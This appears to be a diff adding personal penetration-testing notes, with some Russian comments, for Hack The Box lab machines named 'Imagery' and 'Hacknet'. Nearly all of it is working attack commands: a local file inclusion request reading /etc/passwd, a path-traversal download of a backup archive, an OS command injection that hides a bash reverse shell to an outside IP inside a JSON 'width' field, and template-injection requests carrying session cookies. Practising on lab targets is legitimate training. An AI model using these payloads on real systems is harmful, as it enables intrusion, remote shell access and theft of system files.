@@ -1,0 +1,38 @@
+Imagery (for LFI)
+curl -i -H "Cookie: $COOKIE" \ "ссылка из GET запроса с параметром log_identifier=/etc/passwd"
+
+imagery (OS Command Injection) post request
+curl -s 'http://imagery.htb:8000/apply_visual_transform' \
+  -H 'Content-Type: application/json' \
+  -H 'Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J7yd8m-cP4Ay4kxcQ.aRcvCw.Izgua_JUrPa309RgBAtDI5Bixww' \
+  -d '{                                               
+    "imageId": "7c229052-74b8-48b8-b581-8bb4348dd9f5",
+    "transformType": "crop",
+    "params": {
+      "x": "0",
+      "y": "0",                                                             
+      "width": "100;bash -c '\''bash -i >& /dev/tcp/10.10.14.242/9001 0>&1'\
+      "height": "100"
+    }
+  }'
+
+Imagery for LFI v2:
+curl -s -H "Cookie: $COOKIE" \
+'http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../var/backup/web_20250806_120723.zip.aes' \
+-o web.zip.aes
+
+
+Hacknet SSTI, name={{users.values}} ajax request
+curl -s -b "sessionid=2jfqclxfs3o03s7lpq06hswsdsvlv0t3; csrftoken=SCwCiyBeMpnod0FMSTDyLVs4L8ZGAw1x" \
+  -H "Host: hacknet.htb" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  "http://10.10.11.85/like/22"
+
+curl -s -b "sessionid=2jfqclxfs3o03s7lpq06hswsdsvlv0t3; csrftoken=SCwCiyBeMpnod0FMSTDyLVs4L8ZGAw1x" \
+  -H "Host: hacknet.htb" \
+  "http://10.10.11.85/likes/22"
+
+
+
+-H "Cookie:..." - вручную добавить заголовок Cookie
+-b - специальная опция Curl для Cookie, может принимать значения из файлов.
